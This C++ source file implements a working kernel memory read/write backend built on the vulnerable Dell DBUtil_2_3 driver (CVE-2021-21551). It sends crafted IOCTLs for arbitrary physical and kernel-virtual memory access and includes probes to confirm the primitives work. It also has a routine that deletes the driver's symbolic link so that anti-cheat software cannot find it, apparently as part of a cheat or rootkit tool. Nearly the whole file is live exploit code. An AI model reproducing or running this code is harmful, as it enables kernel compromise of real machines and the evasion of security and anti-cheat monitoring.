#include "r0.hpp"
#include <windows.h>
#include <winternl.h>
#include "vmm.hpp"          // only for vmm::g_ntos_mz_broken
#include <cstring>
#include <cstdio>
#include <vector>

namespace r0 {

// DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
//
// The IOCTL codes and request layouts below were read out of the shipped
// driver image by disassembling its IRP dispatch, not guessed.
//
//   0x9B0C1F40  physical read
//        request  { u64 header; u64 physaddr; u8 payload[]; }
//        length   0x10 + payload_size
//        the driver maps the range with MmMapIoSpace and copies it out.
//
//   0x9B0C1F44  physical write
//        request  { u64 header; u64 physaddr; u8 payload[]; }
//        length   0x10 + payload_size
//        copies the payload IN to the mapped physical range.
//
//   0x9B0C1EC4  kernel virtual read
//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
//        length   0x18 + payload_size
//
//   0x9B0C1EC8  kernel virtual write
//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
//        length   0x18 + payload_size
//        the target is va + offset (offset is read as a 32-bit value).
//
// The kernel-virtual path runs in the caller's thread context, so kernel
// addresses are valid there and the copy goes through the normal cached
// mapping. The physical path uses MmMapIoSpace(..., MmNonCached), whose
// writes bypass the cache and do NOT invalidate other cores' lines - so
// never use it to patch a structure the kernel is actively reading.
//
// The request's first 8 bytes must be zero (or match the cached value from
// the previous call), so the header stays zeroed.
//
// The other IOCTLs the driver exposes are port I/O (0x9B0C1EC0,
// 0x9B0C1F80..0x9B0C1F8C) and query handlers - none are needed here.

namespace {

constexpr DWORD kPhysRead  = 0x9B0C1F40;   // MmMapIoSpace + copy out
constexpr DWORD kPhysWrite = 0x9B0C1F44;   // MmMapIoSpace + copy in
constexpr DWORD kKernWrite = 0x9B0C1EC8;   // memmove to a kernel VA
constexpr DWORD kKernRead  = 0x9B0C1EC4;   // memmove from a kernel VA

constexpr size_t kPhysHdr = 0x10;          // { u64 hdr; u64 pa }
constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }

HANDLE g_dev = INVALID_HANDLE_VALUE;

// Set once the 0x9B0C1EC4 handler is proven to be the read half. Only used
// inside this translation unit, so it stays internal.
bool g_vread_ok = false;

// One attempt at the direction probe.
//
//   payload=false  header only (in 0x18, out 0x18+len). Harmless under BOTH
//                  readings: a read handler that sizes its copy from
//                  OutputBufferLength fills the buffer, a write handler has
//                  zero payload bytes to copy.
//   payload=true   in 0x18+len, out 0x18+len, payload zeroed. This is the
//                  shape a read handler that sizes its copy from
//                  InputBufferLength needs. Under the write reading it
//                  memmoves `len` zero bytes over the target.
//
// Returns 1 = MZ came back (read handler), 0 = no MZ, -1 = IOCTL failed.
// `zero_back` is set when the payload region came back all zeroes, i.e. our
// own zero payload was echoed unchanged - the transposed signature.
int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
    zero_back = false;
    std::vector<uint8_t> in(kKernHdr + (payload ? len : 0), 0);
    memcpy(in.data() + 0x08, &va, 8);

    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
                         out.data(), (DWORD)out.size(), &got, nullptr))
        return -1;

    static const uint8_t mz[2] = { 'M', 'Z' };
    if (len >= 2) {
        // Handlers either append past the header (the layout do_read and
        // do_vwrite use) or copy into the start of the shared buffer.
        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
        if (memcmp(out.data(), mz, 2) == 0) return 1;
    }

    if (payload) {
        bool z = true;
        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
        zero_back = z;
    }
    return 0;
}

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    return g_dev != INVALID_HANDLE_VALUE;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool do_read(uint64_t pa, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kPhysRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    // `got` is not trusted: the dispatch may report the payload length, 0, or
    // the whole request depending on the branch. The content is validated by
    // the caller's non-zero probe, not by this count.
    memcpy(out, buf.data() + kPhysHdr, len);
    return true;
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    memcpy(buf.data() + kPhysHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kPhysWrite, buf.data(), (DWORD)buf.size(),
                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

bool do_vread(uint64_t va, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    // Same guard as the write path: a non-canonical value sent to the kernel
    // handler would be dereferenced by memmove.
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kKernHdr, len);
    return true;
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    // Only canonical kernel addresses. If the IOCTL table were ever transposed
    // again, the physical handler would treat this value as a physical address
    // and try to map it; refusing user-range values here keeps that from
    // becoming a mapping of an arbitrary PTE-derived address.
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    memcpy(buf.data() + kKernHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kKernWrite, buf.data(), (DWORD)buf.size(),
                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

// Global backend pointer - initialised once by init().
// NOTE: starts as nullptr on purpose. If it pointed at the backend table
// from the start, init() would short-circuit on the `if (g_be)` check and
// never open the device, reporting success with no driver present.
Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

} // anonymous namespace

// ---------------------------------------------------------------------------
// Direction probe for the kernel-VA pair.
//
// The 0x9B0C1EC4 handler is documented as the read half, but that pair has
// never been exercised live, and a transposed pair would memmove zeroes over
// ntoskrnl's header. So the direction is proven before the path is used.
//
// Stage A carries the header only, which is harmless under either reading.
// Stage B carries a full-length zero payload, which a read handler that sizes
// from InputBufferLength needs - and which, if the handler turns out to be the
// write half, costs two bytes of ntoskrnl's "MZ". That is reported, and
// vmm::mz_ok() keeps every header-based path working for the rest of the boot.
//
// Deliberately no retry loop: both stages are idempotent and cheap.
// ---------------------------------------------------------------------------
bool vread_probe(uint64_t va, size_t len) {
    if (g_vread_ok) return true;
    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
    if (va < 0xFFFF800000000000ull) return false;

    bool zb = false;

    // Stage A: header only. Nothing is written under either reading.
    if (try_vread(va, len, false, zb) == 1) { g_vread_ok = true; return true; }

    // Stage B: reached only when the handler ignored a zero-length payload,
    // i.e. it sizes the copy from InputBufferLength.
    if (try_vread(va, len, true, zb) == 1) { g_vread_ok = true; return true; }

    if (zb) {
        vmm::g_ntos_mz_broken = true;
        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
               "ntoskrnl+0 now holds 00 00; header paths are degraded for this "
               "boot.\n", (unsigned)kKernRead);
    }
    return false;
}

bool vread_ready() { return g_vread_ok; }

// ---------------------------------------------------------------------------
// Public surface
// ---------------------------------------------------------------------------
bool init() {
    if (g_be) return true;
    if (!open_dev()) return false;

    // Prove the physical read path really reads.
    //
    // The failure this catches: if the two physical IOCTLs are transposed,
    // every "read" is a *write* of the zero-filled request buffer, and the
    // returned buffer stays zero. The previous version compared two such
    // buffers, found them equal, and printed "driver ok" while zeroing RAM.
    //
    // So read a handful of low physical addresses that carry non-zero
    // firmware data (BIOS data area at 0x400, its 640 KB memory-size word at
    // 0x413) and require at least one non-zero byte. Low memory is chosen
    // deliberately: if the table IS transposed, the only damage before we
    // bail is a few 8-byte zeroes in reserved low RAM, not an 8-million-page
    // CR3 scan.
    //
    // There is intentionally NO physical write probe here. The write paths are
    // exercised by --kwtest and the cloak, both of which are opt-in.
    static const uint64_t kProbePa[] = { 0x400, 0x410, 0x420, 0x1000, 0x2000 };
    bool any = false;
    for (uint64_t pa : kProbePa) {
        uint8_t b[16]{};
        if (!do_read(pa, b, sizeof(b))) {
            printf("[!] physical read failed at 0x%llx (IOCTL 0x%08X)\n",
                   (unsigned long long)pa, (unsigned)kPhysRead);
            close_dev();
            return false;
        }
        for (uint8_t v : b) any |= (v != 0);
        if (any) break;
    }
    if (!any) {
        printf("[!] physical reads returned all zeros - IOCTL pair swapped?\n");
        close_dev();
        return false;
    }

    g_be = &g_be_local;
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }

void set_backend(const Backend* be) { g_be = be; }

bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

// ---------------------------------------------------------------------------
// \??\DBUtil_2_3 removal.
//
// DriverEntry creates \Device\DBUtil_2_3 and the symbolic link \??\DBUtil_2_3
// (shown as \DosDevices\DBUtil_2_3). The link is what makes
// CreateFile("\\.\DBUtil_2_3") work, and it is also a name an anti-cheat can
// enumerate. IoCreateSymbolicLink creates the link as a permanent object, so
// the way to remove the name is:
//
//   1. open the link with DELETE access,
//   2. NtMakeTemporaryObject clears OBJ_PERMANENT,
//   3. close the handle - the object directory entry goes away.
//
// The device object is not touched. Our already-open handle refers to it
// directly, so I/O through it keeps working; a later process opening by path
// gets OBJECT_NAME_NOT_FOUND. \Driver\DBUtil_2_3 and the service registry key
// survive this - they need object-directory surgery, not a link removal.
// ---------------------------------------------------------------------------
using NtOpenSymbolicLinkObjectFn =
    NTSTATUS (NTAPI*)(HANDLE*, ACCESS_MASK, PUNICODE_STRING);
using NtMakeTemporaryObjectFn = NTSTATUS (NTAPI*)(HANDLE);

bool hide_symlink(const wchar_t* link) {
    if (!link || !*link) return false;

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    const auto nt_open = reinterpret_cast<NtOpenSymbolicLinkObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtOpenSymbolicLinkObject")));
    const auto nt_temp = reinterpret_cast<NtMakeTemporaryObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtMakeTemporaryObject")));
    if (!nt_open || !nt_temp) {
        printf("[!] ntdll is missing NtOpenSymbolicLinkObject / "
               "NtMakeTemporaryObject\n");
        return false;
    }

    UNICODE_STRING name{};
    name.Buffer = const_cast<PWSTR>(link);
    name.Length = static_cast<USHORT>(wcslen(link) * sizeof(wchar_t));
    name.MaximumLength = name.Length;

    HANDLE h = nullptr;
    NTSTATUS st = nt_open(&h, DELETE, &name);
    if (st < 0) {
        printf("[!] open %ls failed: 0x%08lX - DELETE access refused?\n",
               link, static_cast<unsigned long>(st));
        return false;
    }

    st = nt_temp(h);
    CloseHandle(h);                 // deletion happens when the last handle closes
    if (st < 0) {
        printf("[!] NtMakeTemporaryObject failed: 0x%08lX\n",
               static_cast<unsigned long>(st));
        return false;
    }

    // Prove the name is gone. The device is exclusive and already open by us,
    // so "still there" would surface as a sharing/access error, not a success;
    // only not-found means the link was actually removed.
    HANDLE probe = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (probe != INVALID_HANDLE_VALUE) {
        CloseHandle(probe);
        printf("[!] \\\\.\\DBUtil_2_3 still opens - the link was not removed\n");
        return false;
    }
    const DWORD err = GetLastError();
    if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
        printf("[!] \\\\.\\DBUtil_2_3 still resolves (error %lu) - "
               "the link was not removed\n", err);
        return false;
    }
    return true;
}

} // namespace r0